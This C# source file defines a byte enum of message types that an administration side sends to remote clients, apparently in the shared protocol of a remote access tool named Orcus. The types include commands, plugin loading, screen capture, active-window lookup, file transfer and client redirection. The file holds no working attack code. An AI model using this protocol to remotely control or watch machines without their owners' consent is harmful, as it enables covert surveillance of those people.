﻿namespace Orcus.Shared.Communication
{
    public enum FromAdministrationPackage : byte
    {
        InitializeNewSession,
        CloseSession,
        SendCommand,
        SendCommandCompressed,
        SendDynamicCommand,
        SendDynamicCommandCompressed,
        SendStaticCommand,
        SendStaticCommandCompressed,
        LoadPlugin,
        PLACEHOLDER,
        PLACEHOLDER2,
        DataTransferProtocol,
        GetActiveWindow,
        GetScreen,
        AcceptPush,
        TransferCompleted,
        IsAlive,
        SendStaticCommandPlugin,
        SendPlugin,
        ClientRedirect,
        RequestLibraryInformation,
        SendLibraries,
        StopActiveCommand
    }
}